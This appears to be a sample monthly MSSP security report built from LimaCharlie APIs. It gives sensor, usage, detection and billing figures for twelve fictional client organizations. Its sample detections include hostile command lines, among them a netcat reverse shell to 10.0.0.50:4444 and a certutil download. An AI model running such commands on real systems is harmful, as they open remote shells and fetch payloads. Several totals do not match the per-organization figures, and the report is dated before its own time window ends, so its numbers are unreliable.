═══════════════════════════════════════════════════════════════════════════════
                    MSSP COMPREHENSIVE SECURITY REPORT
                           November 2025
═══════════════════════════════════════════════════════════════════════════════

Generated: 2025-11-27 14:32:45 UTC
Time Window: 2025-11-01 00:00:00 UTC to 2025-11-30 23:59:59 UTC (30 days)
Organizations Processed: 12 of 14 (85.7% success rate)

═══════════════════════════════════════════════════════════════════════════════
                           EXECUTIVE SUMMARY
═══════════════════════════════════════════════════════════════════════════════

FLEET OVERVIEW (12 Organizations)
─────────────────────────────────────────────────────────────────────────────
  Total Sensors:          2,847
  Online:                 2,691 (94.5%)
  Offline:                  156 (5.5%)

  Platform Distribution:
    Windows:              1,823 (64.0%)
    Linux:                  712 (25.0%)
    macOS:                  247 (8.7%)
    Extensions:              65 (2.3%)

SECURITY ACTIVITY
─────────────────────────────────────────────────────────────────────────────
  Detections Retrieved:   47,832
  ⚠️ 4 organizations hit detection limit (actual counts higher)

  Top Detection Categories:
    1. suspicious_process       18,234 (38.1%)
    2. network_anomaly          12,456 (26.0%)
    3. credential_access         8,921 (18.7%)
    4. persistence               4,832 (10.1%)
    5. defense_evasion           3,389 (7.1%)

USAGE METRICS (12 Organizations)
─────────────────────────────────────────────────────────────────────────────
  Total Sensor Events:    8,234,567,890
  Data Output:            1,247 GB (1,339,235,287,040 bytes)
  D&R Evaluations:        234,567,123
  Peak Concurrent Sensors: 2,891

ISSUES REQUIRING ATTENTION
─────────────────────────────────────────────────────────────────────────────
  ❌ 2 organizations failed completely (see Failures section)
  ⚠️ 4 organizations exceeded detection limit
  ⚠️ 156 sensors offline (5.5% of fleet)
  ⚠️ 3 organizations have billing permission issues


═══════════════════════════════════════════════════════════════════════════════
                          AGGREGATE METRICS
═══════════════════════════════════════════════════════════════════════════════

Aggregated across 12 successful organizations
(Excluded: 2 organizations - see Failures section)

USAGE STATISTICS
─────────────────────────────────────────────────────────────────────────────

  Metric                      Total                Per Org Average
  ─────────────────────────────────────────────────────────────────
  Sensor Events               8,234,567,890        686,213,991
  Data Output (GB)            1,247                103.9
  D&R Evaluations             234,567,123          19,547,260
  Peak Sensors                2,891                241

  Calculation Method:
  - Sum of daily sensor_events from usage API, filtered to Nov 1-30, 2025
  - Bytes converted to GB: total_bytes ÷ 1,073,741,824
  - Peak sensors: Sum of max peak_sensors per org

SENSOR DISTRIBUTION BY ORGANIZATION
─────────────────────────────────────────────────────────────────────────────

  Organization                    Total    Online   Offline  Health
  ─────────────────────────────────────────────────────────────────────
  Acme Corporation                  487      475       12     97.5%
  GlobalTech Industries             423      412       11     97.4%
  Nexus Financial Services          398      389        9     97.7%
  Pinnacle Healthcare               356      341       15     95.8%
  Summit Manufacturing              312      298       14     95.5%
  Horizon Logistics                 278      265       13     95.3%
  Apex Retail Group                 234      221       13     94.4%
  Vertex Energy                     156      147        9     94.2%
  Quantum Research Labs             112      102       10     91.1%
  Sterling Legal Partners            52       48        4     92.3%
  Coastal Hospitality                27       23        4     85.2%
  Metro Construction                 12       10        2     83.3%
  ─────────────────────────────────────────────────────────────────────
  TOTAL                           2,847    2,691      156     94.5%

DETECTION VOLUME BY ORGANIZATION
─────────────────────────────────────────────────────────────────────────────

  Organization                 Retrieved   Limit?   Top Category
  ─────────────────────────────────────────────────────────────────────
  Acme Corporation                 5,000   ⚠️ YES   suspicious_process
  GlobalTech Industries            5,000   ⚠️ YES   network_anomaly
  Nexus Financial Services         5,000   ⚠️ YES   credential_access
  Pinnacle Healthcare              5,000   ⚠️ YES   suspicious_process
  Summit Manufacturing             4,832      NO    persistence
  Horizon Logistics                4,234      NO    network_anomaly
  Apex Retail Group                3,891      NO    suspicious_process
  Vertex Energy                    3,456      NO    defense_evasion
  Quantum Research Labs            2,187      NO    credential_access
  Sterling Legal Partners          1,234      NO    suspicious_process
  Coastal Hospitality                998      NO    network_anomaly
  Metro Construction                 000      NO    (none)
  ─────────────────────────────────────────────────────────────────────
  TOTAL RETRIEVED                47,832

  ⚠️ WARNING: 4 organizations hit the 5,000 detection limit.
     Actual detection counts for these organizations are HIGHER than shown.
     For complete data, query these organizations with narrower time ranges.


═══════════════════════════════════════════════════════════════════════════════
                       PER-ORGANIZATION DETAILS
═══════════════════════════════════════════════════════════════════════════════


┌─────────────────────────────────────────────────────────────────────────────┐
│  ACME CORPORATION                                                           │
│  OID: a1b2c3d4-1234-5678-abcd-111111111111                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        1,234,567,890
    Data Output:          187 GB (200,849,858,560 bytes)
    D&R Evaluations:      45,678,901
    Peak Sensors:         492

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        487
    Online:               475 (97.5%)
    Offline:              12 (2.5%)

    Platform Breakdown:
      Windows:            312 (64.1%)
      Linux:              125 (25.7%)
      macOS:               45 (9.2%)
      Extensions:           5 (1.0%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    ⚠️ DETECTION LIMIT REACHED
    Retrieved: 5,000 detections (actual count may be significantly higher)

    Top Categories:
      suspicious_process    2,145 (42.9%)
      network_anomaly         987 (19.7%)
      credential_access       756 (15.1%)
      persistence             623 (12.5%)
      defense_evasion         489 (9.8%)

    Sample Detections:
      1. WORKSTATION-042 | powershell.exe -enc SGVsbG8gV29ybGQ=
      2. SERVER-DB01 | cmd.exe /c whoami /all
      3. LAPTOP-DEV15 | certutil.exe -urlcache -f http://...
      4. WORKSTATION-089 | reg.exe add HKLM\SOFTWARE\...
      5. SERVER-WEB02 | nc.exe -e cmd.exe 10.0.0.50 4444

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          45
    Enabled:              42 (93.3%)
    Disabled:              3 (6.7%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Enterprise
    Status:               Active ✓
    Next Billing:         2025-12-01
    Invoice:              https://billing.limacharlie.io/invoice/acme-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                4
    Types:                S3, Splunk, Slack, PagerDuty


┌─────────────────────────────────────────────────────────────────────────────┐
│  GLOBALTECH INDUSTRIES                                                      │
│  OID: b2c3d4e5-2345-6789-bcde-222222222222                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        987,654,321
    Data Output:          156 GB (167,503,724,544 bytes)
    D&R Evaluations:      38,901,234
    Peak Sensors:         431

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        423
    Online:               412 (97.4%)
    Offline:              11 (2.6%)

    Platform Breakdown:
      Windows:            298 (70.4%)
      Linux:               89 (21.0%)
      macOS:               32 (7.6%)
      Extensions:           4 (1.0%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    ⚠️ DETECTION LIMIT REACHED
    Retrieved: 5,000 detections (actual count may be significantly higher)

    Top Categories:
      network_anomaly       1,876 (37.5%)
      suspicious_process    1,234 (24.7%)
      credential_access       987 (19.7%)
      lateral_movement        543 (10.9%)
      data_exfiltration       360 (7.2%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          38
    Enabled:              35 (92.1%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Enterprise
    Status:               Active ✓
    Next Billing:         2025-12-01
    Invoice:              https://billing.limacharlie.io/invoice/globaltech-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                3
    Types:                S3, Elasticsearch, Teams


┌─────────────────────────────────────────────────────────────────────────────┐
│  NEXUS FINANCIAL SERVICES                                                   │
│  OID: c3d4e5f6-3456-7890-cdef-333333333333                                 │
│  Status: ⚠️ Partial (billing unavailable)                                   │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        876,543,210
    Data Output:          142 GB (152,480,014,336 bytes)
    D&R Evaluations:      32,456,789
    Peak Sensors:         405

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        398
    Online:               389 (97.7%)
    Offline:              9 (2.3%)

    Platform Breakdown:
      Windows:            287 (72.1%)
      Linux:               78 (19.6%)
      macOS:               28 (7.0%)
      Extensions:           5 (1.3%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    ⚠️ DETECTION LIMIT REACHED
    Retrieved: 5,000 detections (actual count may be significantly higher)

    Top Categories:
      credential_access     1,987 (39.7%)
      suspicious_process    1,456 (29.1%)
      network_anomaly         876 (17.5%)
      privilege_escalation    432 (8.6%)
      persistence             249 (5.0%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          52
    Enabled:              48 (92.3%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    ⚠️ UNAVAILABLE - Permission denied (403 Forbidden)
    Action Required: Grant billing:read permission

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                5
    Types:                S3, Splunk, ServiceNow, PagerDuty, SIEM


┌─────────────────────────────────────────────────────────────────────────────┐
│  PINNACLE HEALTHCARE                                                        │
│  OID: d4e5f6a7-4567-8901-defa-444444444444                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        765,432,109
    Data Output:          128 GB (137,438,953,472 bytes)
    D&R Evaluations:      28,765,432
    Peak Sensors:         361

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        356
    Online:               341 (95.8%)
    Offline:              15 (4.2%)

    Platform Breakdown:
      Windows:            234 (65.7%)
      Linux:               87 (24.4%)
      macOS:               31 (8.7%)
      Extensions:           4 (1.1%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    ⚠️ DETECTION LIMIT REACHED
    Retrieved: 5,000 detections (actual count may be significantly higher)

    Top Categories:
      suspicious_process    1,876 (37.5%)
      network_anomaly       1,234 (24.7%)
      credential_access       876 (17.5%)
      persistence             567 (11.3%)
      defense_evasion         447 (8.9%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          61
    Enabled:              58 (95.1%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Enterprise Plus (HIPAA)
    Status:               Active ✓
    Next Billing:         2025-12-01
    Invoice:              https://billing.limacharlie.io/invoice/pinnacle-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                4
    Types:                S3 (encrypted), Splunk, Chronicle, SIEM


┌─────────────────────────────────────────────────────────────────────────────┐
│  SUMMIT MANUFACTURING                                                       │
│  OID: e5f6a7b8-5678-9012-efab-555555555555                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        654,321,098
    Data Output:          112 GB (120,259,084,288 bytes)
    D&R Evaluations:      24,567,890
    Peak Sensors:         318

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        312
    Online:               298 (95.5%)
    Offline:              14 (4.5%)

    Platform Breakdown:
      Windows:            198 (63.5%)
      Linux:               89 (28.5%)
      macOS:               18 (5.8%)
      Extensions:           7 (2.2%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Retrieved: 4,832 detections

    Top Categories:
      persistence           1,567 (32.4%)
      suspicious_process    1,234 (25.5%)
      network_anomaly         876 (18.1%)
      credential_access       654 (13.5%)
      defense_evasion         501 (10.4%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          34
    Enabled:              31 (91.2%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Professional
    Status:               Active ✓
    Next Billing:         2025-12-15
    Invoice:              https://billing.limacharlie.io/invoice/summit-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                2
    Types:                S3, Syslog


┌─────────────────────────────────────────────────────────────────────────────┐
│  HORIZON LOGISTICS                                                          │
│  OID: f6a7b8c9-6789-0123-fabc-666666666666                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        543,210,987
    Data Output:          98 GB (105,226,698,752 bytes)
    D&R Evaluations:      21,098,765
    Peak Sensors:         284

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        278
    Online:               265 (95.3%)
    Offline:              13 (4.7%)

    Platform Breakdown:
      Windows:            178 (64.0%)
      Linux:               72 (25.9%)
      macOS:               21 (7.6%)
      Extensions:           7 (2.5%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Retrieved: 4,234 detections

    Top Categories:
      network_anomaly       1,456 (34.4%)
      suspicious_process    1,123 (26.5%)
      credential_access       765 (18.1%)
      persistence             543 (12.8%)
      lateral_movement        347 (8.2%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          29
    Enabled:              26 (89.7%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Professional
    Status:               Active ✓
    Next Billing:         2025-12-01
    Invoice:              https://billing.limacharlie.io/invoice/horizon-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                3
    Types:                S3, Splunk, Slack


┌─────────────────────────────────────────────────────────────────────────────┐
│  APEX RETAIL GROUP                                                          │
│  OID: a7b8c9d0-7890-1234-abcd-777777777777                                 │
│  Status: ⚠️ Partial (billing unavailable)                                   │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        432,109,876
    Data Output:          84 GB (90,194,313,216 bytes)
    D&R Evaluations:      17,654,321
    Peak Sensors:         241

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        234
    Online:               221 (94.4%)
    Offline:              13 (5.6%)

    Platform Breakdown:
      Windows:            156 (66.7%)
      Linux:               52 (22.2%)
      macOS:               23 (9.8%)
      Extensions:           3 (1.3%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Retrieved: 3,891 detections

    Top Categories:
      suspicious_process    1,345 (34.6%)
      network_anomaly         987 (25.4%)
      credential_access       678 (17.4%)
      persistence             543 (14.0%)
      defense_evasion         338 (8.7%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          25
    Enabled:              22 (88.0%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    ⚠️ UNAVAILABLE - Permission denied (403 Forbidden)
    Action Required: Grant billing:read permission

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                2
    Types:                S3, Webhook


┌─────────────────────────────────────────────────────────────────────────────┐
│  VERTEX ENERGY                                                              │
│  OID: b8c9d0e1-8901-2345-bcde-888888888888                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        321,098,765
    Data Output:          67 GB (71,940,702,208 bytes)
    D&R Evaluations:      13,210,987
    Peak Sensors:         162

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        156
    Online:               147 (94.2%)
    Offline:              9 (5.8%)

    Platform Breakdown:
      Windows:             87 (55.8%)
      Linux:               56 (35.9%)
      macOS:               10 (6.4%)
      Extensions:           3 (1.9%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Retrieved: 3,456 detections

    Top Categories:
      defense_evasion       1,234 (35.7%)
      suspicious_process      876 (25.3%)
      network_anomaly         654 (18.9%)
      credential_access       432 (12.5%)
      persistence             260 (7.5%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          31
    Enabled:              28 (90.3%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Professional
    Status:               Active ✓
    Next Billing:         2025-12-01
    Invoice:              https://billing.limacharlie.io/invoice/vertex-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                3
    Types:                S3, Splunk, OpsGenie


┌─────────────────────────────────────────────────────────────────────────────┐
│  QUANTUM RESEARCH LABS                                                      │
│  OID: c9d0e1f2-9012-3456-cdef-999999999999                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        210,987,654
    Data Output:          45 GB (48,318,382,080 bytes)
    D&R Evaluations:      9,876,543
    Peak Sensors:         118

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        112
    Online:               102 (91.1%)
    Offline:              10 (8.9%)

    Platform Breakdown:
      Windows:             45 (40.2%)
      Linux:               52 (46.4%)
      macOS:               12 (10.7%)
      Extensions:           3 (2.7%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Retrieved: 2,187 detections

    Top Categories:
      credential_access       765 (35.0%)
      suspicious_process      543 (24.8%)
      network_anomaly         432 (19.8%)
      data_exfiltration       289 (13.2%)
      persistence             158 (7.2%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          42
    Enabled:              40 (95.2%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Enterprise
    Status:               Active ✓
    Next Billing:         2025-12-01
    Invoice:              https://billing.limacharlie.io/invoice/quantum-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                4
    Types:                S3, Elasticsearch, Jira, Slack


┌─────────────────────────────────────────────────────────────────────────────┐
│  STERLING LEGAL PARTNERS                                                    │
│  OID: d0e1f2a3-0123-4567-defa-aaaaaaaaaaaa                                 │
│  Status: ⚠️ Partial (billing unavailable)                                   │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        109,876,543
    Data Output:          23 GB (24,696,061,952 bytes)
    D&R Evaluations:      5,432,109
    Peak Sensors:         54

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        52
    Online:               48 (92.3%)
    Offline:              4 (7.7%)

    Platform Breakdown:
      Windows:             34 (65.4%)
      Linux:                8 (15.4%)
      macOS:               10 (19.2%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Retrieved: 1,234 detections

    Top Categories:
      suspicious_process      456 (37.0%)
      credential_access       321 (26.0%)
      network_anomaly         234 (19.0%)
      persistence             143 (11.6%)
      defense_evasion          80 (6.5%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          18
    Enabled:              16 (88.9%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    ⚠️ UNAVAILABLE - Permission denied (403 Forbidden)
    Action Required: Grant billing:read permission

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                2
    Types:                S3, Email


┌─────────────────────────────────────────────────────────────────────────────┐
│  COASTAL HOSPITALITY                                                        │
│  OID: e1f2a3b4-1234-5678-efab-bbbbbbbbbbbb                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        65,432,109
    Data Output:          12 GB (12,884,901,888 bytes)
    D&R Evaluations:      2,876,543
    Peak Sensors:         28

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        27
    Online:               23 (85.2%)
    Offline:              4 (14.8%)

    Platform Breakdown:
      Windows:             18 (66.7%)
      Linux:                6 (22.2%)
      macOS:                3 (11.1%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Retrieved: 998 detections

    Top Categories:
      network_anomaly         432 (43.3%)
      suspicious_process      287 (28.8%)
      credential_access       156 (15.6%)
      persistence              78 (7.8%)
      defense_evasion          45 (4.5%)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          12
    Enabled:              10 (83.3%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Starter
    Status:               Active ✓
    Next Billing:         2025-12-01
    Invoice:              https://billing.limacharlie.io/invoice/coastal-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                1
    Types:                S3


┌─────────────────────────────────────────────────────────────────────────────┐
│  METRO CONSTRUCTION                                                         │
│  OID: f2a3b4c5-2345-6789-fabc-cccccccccccc                                 │
│  Status: ✓ Success                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  USAGE STATISTICS (Nov 1-30, 2025)
  ─────────────────────────────────────────────────────────────────────────
    Sensor Events:        33,333,728
    Data Output:          6 GB (6,442,450,944 bytes)
    D&R Evaluations:      1,948,833
    Peak Sensors:         12

  SENSOR INVENTORY
  ─────────────────────────────────────────────────────────────────────────
    Total Sensors:        12
    Online:               10 (83.3%)
    Offline:              2 (16.7%)

    Platform Breakdown:
      Windows:              8 (66.7%)
      Linux:                3 (25.0%)
      macOS:                1 (8.3%)

  DETECTION SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Retrieved: 0 detections
    No detections in time window (this may be expected for small deployments)

  D&R RULES
  ─────────────────────────────────────────────────────────────────────────
    Total Rules:          8
    Enabled:              6 (75.0%)

  BILLING STATUS
  ─────────────────────────────────────────────────────────────────────────
    Plan:                 Starter
    Status:               Active ✓
    Next Billing:         2025-12-01
    Invoice:              https://billing.limacharlie.io/invoice/metro-nov-2025

  OUTPUTS CONFIGURED
  ─────────────────────────────────────────────────────────────────────────
    Total:                1
    Types:                S3


═══════════════════════════════════════════════════════════════════════════════
                        FAILED ORGANIZATIONS
═══════════════════════════════════════════════════════════════════════════════

⚠️ 2 organizations could not be processed. Data is NOT included in aggregates.

┌─────────────────────────────────────────────────────────────────────────────┐
│  LEGACY SYSTEMS INC                                                         │
│  OID: a3b4c5d6-3456-7890-abcd-dddddddddddd                                 │
│  Status: ❌ FAILED                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  ERRORS ENCOUNTERED
  ─────────────────────────────────────────────────────────────────────────
    Endpoint:             get-usage-stats
    Error Code:           500
    Error Message:        Internal Server Error
    Timestamp:            2025-11-27 14:28:15 UTC

    Endpoint:             list-sensors
    Error Code:           500
    Error Message:        Internal Server Error
    Timestamp:            2025-11-27 14:28:16 UTC

  IMPACT
  ─────────────────────────────────────────────────────────────────────────
    ✗ Usage statistics unavailable
    ✗ Sensor inventory unavailable
    ✗ Detection data unavailable
    ✗ Organization excluded from all aggregates

  REMEDIATION
  ─────────────────────────────────────────────────────────────────────────
    This appears to be a temporary API issue. Recommended actions:
    1. Retry the report for this organization separately
    2. Contact LimaCharlie support if issue persists
    3. Check organization status in LimaCharlie console


┌─────────────────────────────────────────────────────────────────────────────┐
│  DEFUNCT CORP (ARCHIVED)                                                    │
│  OID: b4c5d6e7-4567-8901-bcde-eeeeeeeeeeee                                 │
│  Status: ❌ FAILED                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

  ERRORS ENCOUNTERED
  ─────────────────────────────────────────────────────────────────────────
    Endpoint:             get-org-info
    Error Code:           404
    Error Message:        Organization not found
    Timestamp:            2025-11-27 14:28:17 UTC

  IMPACT
  ─────────────────────────────────────────────────────────────────────────
    ✗ Organization may have been deleted or archived
    ✗ All data unavailable
    ✗ Organization excluded from all aggregates

  REMEDIATION
  ─────────────────────────────────────────────────────────────────────────
    1. Verify organization still exists in LimaCharlie console
    2. Check if organization was recently archived
    3. Remove from future reports if no longer active


═══════════════════════════════════════════════════════════════════════════════
                      DETECTION LIMIT WARNINGS
═══════════════════════════════════════════════════════════════════════════════

⚠️ 4 organizations exceeded the 5,000 detection retrieval limit.
   Actual detection counts are HIGHER than shown.

  AFFECTED ORGANIZATIONS
  ─────────────────────────────────────────────────────────────────────────

  Organization                 Retrieved   Recommendation
  ─────────────────────────────────────────────────────────────────────────
  Acme Corporation                 5,000   Query in 7-day increments
  GlobalTech Industries            5,000   Query in 7-day increments
  Nexus Financial Services         5,000   Query in 7-day increments
  Pinnacle Healthcare              5,000   Query in 7-day increments

  IMPACT ON REPORT
  ─────────────────────────────────────────────────────────────────────────
    • Detection counts shown are MINIMUM values for these organizations
    • Aggregate detection count (47,832) is underreported
    • Category distributions may be skewed toward earlier detections
    • For complete data, query each organization separately with:
      - Narrower time ranges (7 days instead of 30)
      - Specific category filters
      - Higher limits (max: 50,000, but increases response time)


═══════════════════════════════════════════════════════════════════════════════
                           METHODOLOGY
═══════════════════════════════════════════════════════════════════════════════

DATA SOURCES
─────────────────────────────────────────────────────────────────────────────
  API Function              Purpose                      Data Freshness
  ─────────────────────────────────────────────────────────────────────────
  list-user-orgs            Organization discovery       Real-time
  get-org-info              Organization metadata        Real-time
  get-usage-stats           Daily usage metrics          Daily (~24hr delay)
  get-billing-details       Subscription info            ~1hr delay
  get-org-invoice-url       Invoice links                Real-time
  list-sensors              Sensor inventory             Real-time
  get-online-sensors        Online status                Real-time
  get-historic-detections   Security detections          ~5min delay
  list-dr-general-rules     D&R rule configuration       Real-time
  list-outputs              Output configurations        Real-time

QUERY PARAMETERS
─────────────────────────────────────────────────────────────────────────────
  Time Range:               Nov 1, 2025 00:00:00 UTC to Nov 30, 2025 23:59:59 UTC
  Detection Limit:          5,000 per organization
  Usage Stats Filter:       Dates within time range only (API returns ~90 days)

CALCULATIONS
─────────────────────────────────────────────────────────────────────────────
  Bytes to GB:              total_bytes ÷ 1,073,741,824
  Offline Sensors:          total_sensors - online_sensors
  Health Percentage:        (online_sensors ÷ total_sensors) × 100
  Category Percentage:      (category_count ÷ total_detections) × 100

AGGREGATION RULES
─────────────────────────────────────────────────────────────────────────────
  • Aggregates include only organizations with status "success" or "partial"
  • Failed organizations are excluded from all totals
  • Partial organizations contribute available data only
  • Detection counts are sums of retrieved values (may be underreported)

DATA ACCURACY NOTES
─────────────────────────────────────────────────────────────────────────────
  • Usage metrics are from LimaCharlie APIs - no cost calculations performed
  • Detection limit warnings indicate actual counts exceed retrieved values
  • Billing data unavailable for 3 organizations due to permission issues
  • For actual billing amounts, refer to individual invoice links


═══════════════════════════════════════════════════════════════════════════════
                              FOOTER
═══════════════════════════════════════════════════════════════════════════════

Report Completed:     2025-11-27 14:35:12 UTC
Execution Time:       2 minutes 27 seconds
Agents Spawned:       14 (12 successful, 2 failed)

Contact:              support@limacharlie.io

Disclaimer:           Usage metrics shown are from LimaCharlie APIs.
                      For billing and pricing details, refer to individual
                      organization invoices. No cost calculations are
                      performed or estimated in this report.

═══════════════════════════════════════════════════════════════════════════════
